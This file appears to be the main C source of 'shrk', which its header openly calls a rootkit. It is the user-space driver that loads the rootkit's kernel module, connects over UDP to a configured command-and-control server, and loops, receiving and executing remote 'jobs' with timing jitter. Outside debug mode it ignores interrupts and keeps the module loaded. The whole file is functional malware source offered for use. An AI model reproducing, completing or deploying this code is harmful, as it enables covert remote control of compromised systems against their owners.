#include "inc/client.h"
#include "inc/kernel.h"
#include "inc/cmds.h"
#include "inc/util.h"
#include "inc/save.h"
#include "inc/job.h"

#include <stdbool.h>
#include <strings.h>

#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

// clang-format off

/*

 * shrk/user | user binary/driver for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

bool should_quit = false;

void handler(int sig){
  // interrupt can be ignored if we are not running in debug mode
  if(!SHRK_DEBUG && SIGINT == sig)
    return;
    
  debug("got a signal (%d), quitting", sig);
  should_quit = true;
}

int main() {
  signal(SIGINT, handler);
  signal(SIGILL, handler);
  signal(SIGSEGV, handler);

  client_t _client, *client = &_client;
  job_t    _job, *job       = &_job;

  // load the kernel module
  if(!kernel_load())
    return EXIT_FAILURE;

  // initializtion
  randseed();
  job_new(job, client);

  // setup the UDP client connection (also does address resolving)
  if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT) < 0) {
    debug_err("failed to create a connection");
    return EXIT_FAILURE;
  }

  // ask for jobs and handle them
  while (!should_quit) {
    if (!job_recv(job, true))
      goto next;

    debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
    cmd_handle(job);

  next:
    jitter();
  }

  // we are done, free/cleanup stuff
  save_close();
  job_free(job);
  
  // we can remove the kernel module if we are in debug mode
  if(SHRK_DEBUG)
    kernel_unload();

  return EXIT_SUCCESS;
}
